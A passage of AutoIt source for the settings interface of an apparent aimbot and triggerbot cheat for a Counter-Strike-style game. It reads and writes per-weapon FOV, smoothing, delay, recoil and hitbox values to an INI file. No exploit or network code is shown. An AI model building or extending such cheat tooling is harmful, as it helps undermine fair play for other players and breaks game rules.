				IniWrite($FileSet, "WeaponSettings", "aimbot_negev.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_negev.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_negev.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_negev.rcs", $readrcsvalue)
				EndIf
				If $readw = "sawedoff" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sawedoff.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sawedoff.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sawedoff.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sawedoff.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_sawedoff.rcs", $readrcsvalue)
				EndIf
				If $readw = "tec9" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tec9.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tec9.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tec9.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tec9.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_tec9.rcs", $readrcsvalue)
				EndIf
				If $readw = "taser" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_taser.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_taser.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_taser.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_taser.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_taser.rcs", $readrcsvalue)
				EndIf
				If $readw = "mp9" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp9.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp9.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp9.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp9.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_mp9.rcs", $readrcsvalue)
				EndIf
				If $readw = "scar17" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar17.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar17.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar17.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar17.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_scar17.rcs", $readrcsvalue)
				EndIf
				If $readw = "ssg08" Then
				IniWrite( $FileSet, "Settings", "Aimbot_Key", $key)
				IniWrite( $FileSet, "Settings", "Aimbot_Smooth", $smooth)
				IniWrite( $FileSet, "Settings", "Aimbot_VisibilityCheck", $viasghfaf)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ssg08.fov", $readfovvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ssg08.height", $readheightvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ssg08.delay", $readdelayvalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ssg08.enabled", $readenablevalue)
				IniWrite($FileSet, "WeaponSettings", "aimbot_ssg08.rcs", $readrcsvalue)
				EndIf



		Case $thCombo
            Switch GUICtrlRead($thCombo)


                Case "Deagle"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_deagle.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_deagle.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_deagle.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_deagle.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_deagle.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf


                Case "P2000"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_P2000.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_P2000.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_P2000.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_P2000.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_P2000.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

                Case "elite"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_elite.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_elite.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_elite.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_elite.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_elite.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "p90"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_p90.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_p90.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p90.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p90.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p90.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mac10"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mac10.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mac10.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mac10.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mac10.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mac10.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "bizon"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_bizon.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_bizon.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_bizon.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_bizon.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_bizon.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "sg553"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sg553.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_sg553.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg553.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg553.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_sg553.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "fiveseven"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_fiveseven.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_fiveseven.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_fiveseven.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_fiveseven.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_fiveseven.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "glock"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_glock.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_glock.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_glock.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_glock.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_glock.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "p228"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_p228.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_p228.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p228.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p228.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p228.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "p250"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_p250.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_p250.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p250.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p250.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_p250.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "usp"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_usp.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_usp.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_usp.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_usp.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_usp.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "famas"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_famas.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_famas.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_famas.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_famas.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_famas.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "ak47"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_ak47.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_ak47.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ak47.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ak47.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ak47.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "nova"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_nova.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_nova.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_nova.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_nova.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_nova.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mag7"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mag7.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mag7.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mag7.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mag7.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mag7.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "ump45"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_ump45.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_ump45.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ump45.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ump45.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_ump45.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "mp7"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mp7.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_mp7.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp7.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp7.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_mp7.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "m4a1"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_m4a1.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_m4a1.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m4a1.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m4a1.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_m4a1.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "galil"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_galil.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_galil.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_galil.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_galil.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_galil.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "galilar"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_galilar.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_galilar.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_galilar.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_galilar.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_galilar.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "aug"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_aug.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_aug.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_aug.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_aug.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_aug.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "scar20"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_scar20.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_scar20.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scar20.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scar20.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_scar20.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "awp"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_awp.allbody", 0)

					$treadenablevalue = IniRead($FileSet, "WeaponSettings", "triggerbot_awp.enabled", 0)

					$treadhitboxvalue = IniRead($FileSet, "Weaponsettings", "triggerbot_awp.hitbox", 0)
					GUICtrlSetData($menuhitbox, $treadhitboxvalue)
					$treadaftervalue = IniRead($FileSet, "Weaponsettings", "triggerbot_awp.afterdelay", 0)
					GUICtrlSetData($menuafter, $treadaftervalue)
					$treadbeforevalue = IniRead($FileSet, "Weaponsettings", "triggerbot_awp.beforedelay", 0)
					GUICtrlSetData($menubefore, $treadbeforevalue)

					If $treadhitvalue = 1 Then
						GUICtrlSetImage($Allbon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Allbon, @TempDir & "\Disable.bmp")
					EndIf

					If $treadenablevalue = 1 Then
						GUICtrlSetImage($Trigon, @TempDir & "\Active.bmp")
					Else
						GUICtrlSetImage($Trigon, @TempDir & "\Disable.bmp")
					EndIf

				Case "g3sg1"
					$treadhitvalue = IniRead($FileSet, "WeaponSettings", "triggerbot_g3sg1.allbody", 0)

